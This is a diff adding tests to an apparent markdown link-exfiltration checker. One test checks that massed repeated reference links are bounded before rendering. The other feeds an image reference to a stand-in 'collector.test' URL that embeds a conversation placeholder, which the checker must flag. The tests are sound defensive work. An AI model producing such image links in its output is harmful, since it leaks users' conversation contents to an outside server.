@@ -586,6 +586,27 @@ def test_raw_text_end_tag_with_solidus_is_flagged(tag: str) -> None:
     assert exfiltration_link_classes(text) in (["exfiltration_query"], ["uncheckable_markup"])
 
 
+@pytest.mark.parametrize("separator", [" ", "\n\n"])
+def test_repeated_reference_destinations_are_bounded_before_rendering(
+    monkeypatch: pytest.MonkeyPatch, separator: str
+) -> None:
+    rendered: list[str] = []
+    original = catalog_security._document_urls
+    monkeypatch.setattr(
+        catalog_security,
+        "_document_urls",
+        lambda html, base, depth: rendered.append(html) or original(html, base, depth),
+    )
+    text = separator.join(["[x]"] * 4096) + "\n\n[x]: https://a.test/" + "a" * 16_000
+    assert exfiltration_link_classes(text) == ["uncheckable_markup"]
+    assert sum(map(len, rendered)) < 10 * len(text)
+
+
+def test_a_few_uses_of_a_reference_are_parsed() -> None:
+    text = " ".join(["![x][x]"] * 50) + "\n\n[x]: https://collector.test/{conversation}.png"
+    assert set(exfiltration_link_classes(text)) == {"exfiltration_query"}
+
+
 def test_oversized_text_without_markup_passes() -> None:
     assert exfiltration_link_classes("x" * MAX_LINK_MARKDOWN_BYTES + " see https://docs.test/a {limit}") == []
 
